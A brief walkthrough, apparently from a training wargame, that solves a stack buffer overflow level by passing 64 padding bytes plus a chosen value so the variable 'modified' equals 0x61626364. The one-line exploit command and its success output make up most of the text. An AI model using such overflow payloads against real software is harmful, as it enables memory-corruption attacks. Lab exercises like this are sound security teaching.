From the available source code you can see variable 'modified' must equal 0x61626364 and because we know the right offset from the previous level, it's a quite easy:

$ ./stack1 $(python -c 'print "A" * 64 + "\x64\x63\x62\x61"')                                        
you have correctly got the variable to the right value
